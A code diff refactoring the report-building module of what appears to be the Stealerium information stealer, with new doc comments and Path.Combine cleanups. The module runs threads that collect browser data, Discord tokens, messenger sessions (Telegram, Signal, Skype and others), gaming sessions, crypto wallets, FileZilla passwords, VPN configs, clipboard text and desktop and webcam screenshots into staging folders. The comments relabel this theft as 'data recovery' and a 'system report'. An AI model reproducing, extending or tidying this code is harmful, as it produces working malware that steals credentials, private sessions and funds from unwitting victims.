@@ -14,24 +14,34 @@ using Stealerium.Target.VPN;
 
 namespace Stealerium.Helpers
 {
+    /// <summary>
+    /// The Report class generates a report by collecting data from different system sources
+    /// and saving it in a specified directory.
+    /// </summary>
     internal sealed class Report
     {
+        /// <summary>
+        /// Creates a system report and saves it to the specified path.
+        /// </summary>
+        /// <param name="sSavePath">The directory where the report will be saved.</param>
+        /// <returns>True if the report was created successfully, otherwise false.</returns>
         public static bool CreateReport(string sSavePath)
         {
-            var tasks = new List<Thread>();
+            var tasks = new List<Thread>(); // List of tasks (threads) to run
 
             try
             {
-                // Create directory for the report
+                // Create the main directory for the report
                 Directory.CreateDirectory(sSavePath);
 
-                // Create subdirectories for various data
+                // Create subdirectories for different data types
                 var browserPath = Path.Combine(sSavePath, "Browsers");
                 var messengerPath = Path.Combine(sSavePath, "Messenger");
                 var gamingPath = Path.Combine(sSavePath, "Gaming");
                 var systemPath = Path.Combine(sSavePath, "System");
                 var vpnPath = Path.Combine(sSavePath, "VPN");
                 var walletsPath = Path.Combine(sSavePath, "Wallets");
+
                 Directory.CreateDirectory(browserPath);
                 Directory.CreateDirectory(messengerPath);
                 Directory.CreateDirectory(gamingPath);
@@ -39,10 +49,10 @@ namespace Stealerium.Helpers
                 Directory.CreateDirectory(vpnPath);
                 Directory.CreateDirectory(walletsPath);
 
-                // Multi-threaded tasks
+                // Multi-threaded task: Grabbing files
                 tasks.Add(CreateTask(() => FileGrabber.Run(sSavePath + "\\Grabber")));
 
-                // Chromium, Edge, and Firefox browsers
+                // Browser data recovery: Chromium, Edge, Firefox
                 tasks.Add(CreateTask(() =>
                 {
                     RecoverChrome.Run(browserPath);
@@ -50,109 +60,115 @@ namespace Stealerium.Helpers
                     RecoverFirefox.Run(browserPath);
                 }));
 
-                // Messenger apps
-                tasks.Add(CreateTask(() => Discord.WriteDiscord(Discord.GetTokens(), messengerPath + "\\Discord")));
-                tasks.Add(CreateTask(() => Pidgin.Get(messengerPath + "\\Pidgin")));
-                tasks.Add(CreateTask(() => Outlook.GrabOutlook(messengerPath + "\\Outlook")));
-                tasks.Add(CreateTask(() => Target.Messengers.Telegram.GetTelegramSessions(messengerPath + "\\Telegram")));
-                tasks.Add(CreateTask(() => Skype.GetSession(messengerPath + "\\Skype")));
-                tasks.Add(CreateTask(() => Element.GetSession(messengerPath + "\\Element")));
-                tasks.Add(CreateTask(() => Signal.GetSession(messengerPath + "\\Signal")));
-                tasks.Add(CreateTask(() => Tox.GetSession(messengerPath + "\\Tox")));
-                tasks.Add(CreateTask(() => Icq.GetSession(messengerPath + "\\ICQ")));
+                // Messenger data recovery
+                tasks.Add(CreateTask(() => Discord.WriteDiscord(Discord.GetTokens(), Path.Combine(messengerPath, "Discord"))));
+                tasks.Add(CreateTask(() => Pidgin.Get(Path.Combine(messengerPath, "Pidgin"))));
+                tasks.Add(CreateTask(() => Outlook.GrabOutlook(Path.Combine(messengerPath, "Outlook"))));
+                tasks.Add(CreateTask(() => Target.Messengers.Telegram.GetTelegramSessions(Path.Combine(messengerPath, "Telegram"))));
+                tasks.Add(CreateTask(() => Skype.GetSession(Path.Combine(messengerPath, "Skype"))));
+                tasks.Add(CreateTask(() => Element.GetSession(Path.Combine(messengerPath, "Element"))));
+                tasks.Add(CreateTask(() => Signal.GetSession(Path.Combine(messengerPath, "Signal"))));
+                tasks.Add(CreateTask(() => Tox.GetSession(Path.Combine(messengerPath, "Tox"))));
+                tasks.Add(CreateTask(() => Icq.GetSession(Path.Combine(messengerPath, "ICQ"))));
 
-                // Gaming sessions
+                // Gaming data recovery
                 tasks.Add(CreateTask(() =>
                 {
-                    Steam.GetSteamSession(gamingPath + "\\Steam");
-                    Uplay.GetUplaySession(gamingPath + "\\Uplay");
-                    BattleNet.GetBattleNetSession(gamingPath + "\\BattleNET");
+                    Steam.GetSteamSession(Path.Combine(gamingPath, "Steam"));
+                    Uplay.GetUplaySession(Path.Combine(gamingPath, "Uplay"));
+                    BattleNet.GetBattleNetSession(Path.Combine(gamingPath, "BattleNET"));
                 }));
-                tasks.Add(CreateTask(() => Minecraft.SaveAll(gamingPath + "\\Minecraft")));
+                tasks.Add(CreateTask(() => Minecraft.SaveAll(Path.Combine(gamingPath, "Minecraft"))));
 
-                // Wallets
+                // Wallet data recovery
                 tasks.Add(CreateTask(() =>
                 {
                     Wallets.GetWallets(walletsPath);
-                    Target.Browsers.Chromium.Extensions.GetChromeWallets(walletsPath + "\\Chrome_Wallet");
-                    Target.Browsers.Edge.Extensions.GetEdgeWallets(walletsPath + "\\Edge_Wallet");
+                    Target.Browsers.Chromium.Extensions.GetChromeWallets(Path.Combine(walletsPath, "Chrome_Wallet"));
+                    Target.Browsers.Edge.Extensions.GetEdgeWallets(Path.Combine(walletsPath, "Edge_Wallet"));
                 }));
 
-                // FileZilla
+                // FileZilla data recovery
                 tasks.Add(CreateTask(() => FileZilla.WritePasswords(sSavePath + "\\FileZilla")));
 
-                // VPNs
+                // VPN data recovery
                 tasks.Add(CreateTask(() =>
                 {
-                    ProtonVpn.Save(vpnPath + "\\ProtonVPN");
-                    OpenVpn.Save(vpnPath + "\\OpenVPN");
-                    NordVpn.Save(vpnPath + "\\NordVPN");
+                    ProtonVpn.Save(Path.Combine(vpnPath, "ProtonVPN"));
+                    OpenVpn.Save(Path.Combine(vpnPath, "OpenVPN"));
+                    NordVpn.Save(Path.Combine(vpnPath, "NordVPN"));
                 }));
 
-                // Directories and system info
+                // System directory and process information
                 tasks.Add(CreateTask(() =>
                 {
                     Directory.CreateDirectory(sSavePath + "\\Directories");
                     DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                 }));
-
                 tasks.Add(CreateTask(() =>
                 {
                     ProcessList.WriteProcesses(systemPath);
                     ActiveWindows.WriteWindows(systemPath);
                 }));
 
-                // Screenshots
+                // Screenshots: Desktop and Webcam
                 tasks.Add(CreateTask(() =>
                 {
                     DesktopScreenshot.Make(systemPath);
                     WebcamScreenshot.Make(systemPath);
                 }));
 
-                // Saved WiFi networks
+                // WiFi networks (saved and scanning)
                 tasks.Add(CreateTask(() =>
                 {
                     Wifi.SavedNetworks(systemPath);
                     Wifi.ScanningNetworks(systemPath);
                 }));
 
-                // Windows product key and debug logs
-                tasks.Add(CreateTask(() =>
-                {
-                    File.WriteAllText(systemPath + "\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry());
-                }));
+                // Windows product key
+                tasks.Add(CreateTask(() => File.WriteAllText(systemPath + "\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry())));
 
-                tasks.Add(CreateTask(() => Logging.Save(systemPath + "\\Debug.txt")));
-
-                // System info
-                tasks.Add(CreateTask(() => SysInfo.Save(systemPath + "\\Info.txt")));
+                // Debug logs and system information
+                tasks.Add(CreateTask(() => Logging.Save(Path.Combine(systemPath, "Debug.txt"))));
+                tasks.Add(CreateTask(() => SysInfo.Save(Path.Combine(systemPath, "Info.txt"))));
 
                 // Clipboard content
-                tasks.Add(CreateTask(() => File.WriteAllText(systemPath + "\\Clipboard.txt", Clipboard.GetText())));
+                tasks.Add(CreateTask(() => File.WriteAllText(Path.Combine(systemPath, "Clipboard.txt"), Clipboard.GetText())));
 
-                // Installed applications
+                // Installed applications list
                 tasks.Add(CreateTask(() => InstalledApps.WriteAppsList(systemPath)));
 
-                // Start all threads
+                // Start all tasks
                 foreach (var task in tasks)
+                {
                     task.Start();
+                }
 
-                // Wait for all threads to finish
+                // Wait for all tasks to finish
                 foreach (var task in tasks)
+                {
                     task.Join();
+                }
 
-                return Logging.Log("Report created");
+                return Logging.Log("Report created successfully");
             }
             catch (Exception ex)
             {
-                return Logging.Log("Failed to create report, error:\n" + ex, false);
+                return Logging.Log($"Failed to create report, error:\n{ex}", false);
             }
         }
 
+        /// <summary>
+        /// Creates a thread for executing a specific task.
+        /// </summary>
+        /// <param name="action">The action to be executed in the thread.</param>
+        /// <returns>A thread object.</returns>
         private static Thread CreateTask(ThreadStart action)
         {
-            var thread = new Thread(action);
-            thread.IsBackground = true;
+            var thread = new Thread(action)
+            {
+                IsBackground = true // Set the thread as a background thread
+            };
             return thread;
         }
     }
